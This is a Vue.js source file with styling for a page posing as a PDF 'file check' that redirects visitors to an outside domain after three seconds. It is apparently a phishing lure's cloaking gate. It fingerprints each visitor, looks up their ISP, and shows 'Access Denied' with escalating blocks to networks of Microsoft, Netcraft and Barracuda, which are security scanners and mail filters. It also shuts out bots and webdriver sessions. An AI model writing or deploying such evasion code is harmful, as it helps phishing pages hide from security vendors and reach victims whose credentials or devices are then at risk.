import { createApp, ref, onMounted } from 'vue';
import { detect } from 'detect-browser';
import FingerprintJS from '@fingerprintjs/fingerprintjs';
import axios from 'axios';
import '@/assets/style.css';

const app = createApp({
  setup() {
    const loading = ref(true);
    const isBot = ref(false);
    const isBlocked = ref(false);
    const visitorIP = ref('');

    const checkVisitorReputation = async () => {
      const browser = detect();
      const fp = await FingerprintJS.load();
      const result = await fp.get();

      try {
        const ipInfo = await axios.get('https://ipapi.co/json/');
        visitorIP.value = ipInfo.data.ip;
        const isp = ipInfo.data.org.toLowerCase();

        const blockedISPs = ["microsoft", "netcraft", "barracuda"];

        const penaltyKey = `penalty_${visitorIP.value}`;
        const penaltyData = JSON.parse(localStorage.getItem(penaltyKey)) || { count: 0, expiry: null };
        const now = new Date().getTime();

        if (blockedISPs.some(blockedISP => isp.includes(blockedISP))) {
          if (penaltyData.expiry && now < penaltyData.expiry) {
            isBlocked.value = true;
            return;
          }

          penaltyData.count += 1;
          if (penaltyData.count === 1) {
            penaltyData.expiry = now + 60 * 60 * 1000;
          } else if (penaltyData.count === 2) {
            penaltyData.expiry = now + 24 * 60 * 60 * 1000;
          } else {
            penaltyData.expiry = now + 365 * 24 * 60 * 60 * 1000;
          }
          localStorage.setItem(penaltyKey, JSON.stringify(penaltyData));
          isBlocked.value = true;
          return;
        }

        if (
          browser?.name === 'bot' ||
          result.components?.adBlock?.value ||
          result.components?.webdriver?.value
        ) {
          isBot.value = true;
        }
      } catch (error) {
        console.error('Error fetching IP info:', error);
      }
    };

    onMounted(async () => {
      await checkVisitorReputation();

      if (isBot.value || isBlocked.value) {
        document.body.innerHTML = '<h1>Access Denied</h1>';
      } else {
        setTimeout(() => {
          window.location.href = 'https://tk.altinbasaknevresim.com.tr';
        }, 3000);
      }
    });

    return { loading, isBot, isBlocked };
  },

  template: `
    <div v-if="!isBot && !isBlocked">
      <div v-if="loading" class="loading-container">
        <img src="/pdf-logo.png" alt="PDF Logo" class="pdf-logo" />
        <p class="loading-text">Checking file, please wait...</p>
      </div>
    </div>
  `,
});

app.mount('#app');

/* Updated CSS */
/* General Page Styling */
body, html {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
  background-color: #001f3f; /* Dark Blue Background */
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

/* Loading Container Styling */
.loading-container {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  height: 100vh;
}

/* PDF Logo Styling */
.pdf-logo {
  width: 120px;
  height: auto;
  margin-bottom: 20px;
  filter: drop-shadow(2px 4px 6px rgba(0, 0, 0, 0.2));
}

/* Loading Text Styling */
.loading-text {
  font-size: 1.5rem;
  color: #ffffff; /* White Text */
  margin-top: 10px;
  letter-spacing: 0.5px;
  text-align: center;
}

/* Spinner Animation */
.spinner {
  width: 60px;
  height: 60px;
  border: 6px solid #e0e0e0;
  border-top-color: #e44d26;
  border-radius: 50%;
  animation: spin 1s infinite linear;
  margin-top: 10px;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}
